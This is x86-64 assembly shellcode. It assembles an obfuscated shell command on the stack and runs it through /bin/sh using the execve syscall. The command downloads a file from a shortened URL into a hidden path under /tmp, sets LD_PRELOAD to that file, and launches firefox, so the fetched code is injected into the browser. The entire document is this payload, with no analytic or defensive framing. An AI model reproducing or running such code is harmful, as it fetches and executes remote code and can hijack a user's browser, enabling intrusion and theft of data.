bits 64
section .text

global _start

_start:
    ; Push the command data
    ; https://shorturl.at/kDMW7
    mov rax, 0x0000000000000078
    push rax
    mov rax, '& firefo'
    push rax
    mov rax, 'tmp/.i &'
    push rax
    mov rax, 'RELOAD=/'
    push rax
    mov rax, 'ort LD_P'
    push rax
    mov rax, 'i && exp'
    push rax
    mov rax, 'O /tmp/.'
    push rax
    mov rax, '/kDMW7 -'
    push rax
    mov rax, 'rturl.at'
    push rax
    mov rax, 'ps://sho'
    push rax
    mov rax, 'wget htt'
    push rax

    mov rax, 0x000000000000632D
    push rax

    mov rax, 0x000000000000762D
    push rax

    mov rax, 0x0068732f6e69622f
    push rax

    
    ; Construct the command for wget
    push 0x00
    lea rcx, [rsp+32]
    push rcx        ; arg2
    lea rcx, [rsp+32]
    push rcx        ; arg1
    lea rcx, [rsp+32]
    push rcx        ; dbg
    lea rcx, [rsp+32]
    push rcx        ; binsh
    lea rdi, [rsp+40] ; filepath
    mov rsi, rsp    ; argv
    xor rdx, rdx    ; envp
    mov rax, 0x3b   ; execve syscall number

    ; Execute command
    syscall
